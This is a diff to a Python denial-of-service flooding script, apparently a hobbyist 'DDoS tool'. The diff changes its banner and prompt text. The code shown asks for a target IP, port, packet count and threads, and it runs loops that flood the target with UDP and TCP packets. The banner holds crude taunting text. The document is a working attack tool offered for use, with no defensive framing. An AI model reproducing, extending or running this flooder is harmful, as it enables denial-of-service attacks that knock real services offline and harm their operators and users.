@@ -6,17 +6,16 @@ import os,sys
 
 os.system("clear")
 print("""
-
-██╗░░██╗███████╗████████╗██╗░░░██╗░░░░░██╗██╗░░░██╗
-██║░██╔╝██╔════╝╚══██╔══╝██║░░░██║░░░░░██║██║░░░██║
-█████═╝░█████╗░░░░░██║░░░██║░░░██║░░░░░██║██║░░░██║
-██╔═██╗░██╔══╝░░░░░██║░░░██║░░░██║██╗░░██║██║░░░██║
-██║░╚██╗███████╗░░░██║░░░╚██████╔╝╚█████╔╝╚██████╔╝
-╚═╝░░╚═╝╚══════╝░░░╚═╝░░░░╚═════╝░░╚════╝░░╚═════╝░""")
+=================================================================
+[ × ]  Ziel Tools DDoS [ × ]
+[ + ]  Ziel Suka TETEK
+[ + ] Ati Ati Down Sayankk
+=================================================================
+Author : Ziel""")
 print("DONT ABUSE YA SAYANK SAYANK KU")
 
-ip = str(input(" Target IP :"))
-port = int(input(" Target Port :"))
+ip = str(input(" Target IP : "))
+port = int(input(" Target Port : "))
 choice = str(input(" GAS MANIEZ? (y/n) : "))
 times = int(input(" Packets : "))
 threads = int(input(" Threads: "))
@@ -31,7 +30,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" ZIEL ATTACKING TO + ip + port")
+			print(i +" ZIEL ATTACKING TO +ip +port")
 		except:
 			print("[X] AMFUN SAYANK")
 
@@ -45,7 +44,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" ZIEL ATTACKING TO + ip + port!")
+			print(i +" ZIEL ATTACKING TO +ip +port!")
 		except:
 			s.close()
 			print("[X] AMFUN SAYANK")
